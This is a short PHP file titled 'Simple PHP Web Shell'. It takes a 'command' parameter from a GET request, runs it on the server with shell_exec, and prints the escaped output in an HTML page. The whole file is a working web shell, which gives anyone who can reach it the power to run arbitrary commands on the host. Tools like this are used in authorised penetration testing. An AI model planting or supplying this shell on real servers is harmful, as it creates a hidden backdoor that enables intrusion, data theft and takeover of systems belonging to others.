<?php $p='command';$o=null;if(isset($_SERVER['REQUEST_METHOD'])&&strtolower($_SERVER['REQUEST_METHOD'])==='get'&&isset($_GET[$p])&&($_GET[$p]=trim($_GET[$p]))&&strlen($_GET[$p])>0){$o=@shell_exec('('.$_GET[$p].') 2>&1');if($o===false){$o='ERROR: The function might be disabled.';}else{$o=str_replace('<','&lt;',$o);$o=str_replace('>','&gt;',$o);}/*echo '<pre>'.$o.'</pre>';unset($o,$_GET[$p]);/*@gc_collect_cycles();*/} ?><!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Simple PHP Web Shell</title><meta name="author" content="Ivan Šincek"><meta name="viewport" content="width=device-width, initial-scale=1.0"></head><body><pre><?php echo $o;unset($o,$_GET[$p]);/*@gc_collect_cycles();*/ ?></pre></body></html>
